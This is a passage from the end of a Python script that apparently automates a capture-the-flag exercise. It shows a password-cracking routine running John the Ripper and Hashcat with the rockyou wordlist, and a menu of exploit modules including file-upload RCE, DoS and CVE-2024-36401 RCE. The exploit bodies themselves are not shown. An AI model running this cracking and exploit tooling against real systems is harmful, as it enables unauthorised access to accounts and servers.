                if password and password != "0 password hashes cracked":
                    print_success(f"John found: {password}")
                    return password
        
        # Phase 3: Hashcat if available
        print_info("\n[Phase 3] Trying with Hashcat...")
        
        if run_command("which hashcat", timeout=5):
            hash_file = "/tmp/hash_to_crack.txt"
            with open(hash_file, 'w') as f:
                f.write(password_hash)
            
            hashcat_cmd = f"hashcat -m {hashcat_mode} -a 0 {hash_file} /usr/share/wordlists/rockyou.txt --runtime=60"
            print_info(f"Command: {hashcat_cmd}")
            
            result = run_command(hashcat_cmd, timeout=70)
            
            if result and ":" in result:
                for line in result.split('\n'):
                    if password_hash in line and ":" in line:
                        password = line.split(':')[-1].strip()
                        print_success(f"Hashcat found: {password}")
                        return password
        
        # Failed: ask manually
        print_warning("\nAutomatic crack failed. Try manually:")
        print(f"  {Colors.CYAN}echo '{password_hash}' > hash.txt{Colors.ENDC}")
        print(f"  {Colors.CYAN}hashcat -m {hashcat_mode} -a 0 hash.txt rockyou.txt{Colors.ENDC}")
        print(f"  {Colors.CYAN}john --format=raw-{hash_type} --wordlist=rockyou.txt hash.txt{Colors.ENDC}")
        print()
        
        password = input(f"{Colors.YELLOW}Password cracked manually: {Colors.ENDC}")
        return password if password else None


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MAIN MENU
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def main_menu():
    """Main menu"""
    
    captured_flags = {}
    
    while True:
        clear_screen()
        banner()
        
        print(f"\n{Colors.BOLD}  MAIN MENU{Colors.ENDC}\n")
        
        print("  [0] Complete Reconnaissance (DNS, Ports, Services)")
        print()
        
        exploits = {
            1: ("FileServer - Bruteforce + ZIP Cracking", Exploit1_FileServer),
            2: ("Travel - File Upload RCE", Exploit2_Travel),
            3: ("Restricted - DoS + Info Disclosure", Exploit3_Restricted),
            4: ("Staging (Liberty) - OSINT", Exploit4_Staging),
            5: ("WebServices - CVE-2024-36401 RCE", Exploit5_WebServices),
        }
        
        for num, (name, _) in exploits.items():
            status = f"{Colors.GREEN}âœ“{Colors.ENDC}" if num in captured_flags else " "
            print(f"  [{status}] [{num}] {name}")
            if num in captured_flags:
                print(f"        â†’ {Colors.YELLOW}{captured_flags[num]}{Colors.ENDC}")
        
        print()
        print(f"  [6] Display all flags")
        print(f"  [9] Exit")
        print()
        
        try:
            choice = input(f"  {Colors.CYAN}Choice: {Colors.ENDC}")
            choice = int(choice)
            
            if choice == 9:
                print_info("\nGoodbye!")
                break
            elif choice == 0:
                recon = Reconnaissance()
                recon.run_full_recon()
                pause()
            elif choice in exploits:
                exploit_class = exploits[choice][1]
                exploit = exploit_class()
                flag = exploit.run()
                if flag:
                    captured_flags[choice] = flag
            elif choice == 6:
                clear_screen()
                print_section("FLAGS CAPTURED")
                if captured_flags:
                    for num, flag in sorted(captured_flags.items()):
                        print(f"  [{num}] {Colors.GREEN}{flag}{Colors.ENDC}")
                else:
                    print_warning("No flags captured")
                pause()
                
        except ValueError:
            pass
        except KeyboardInterrupt:
            print_info("\n\nInterruption.")
            break


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# ENTRY POINT
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print_info("\n\nInterruption.")
        sys.exit(0)
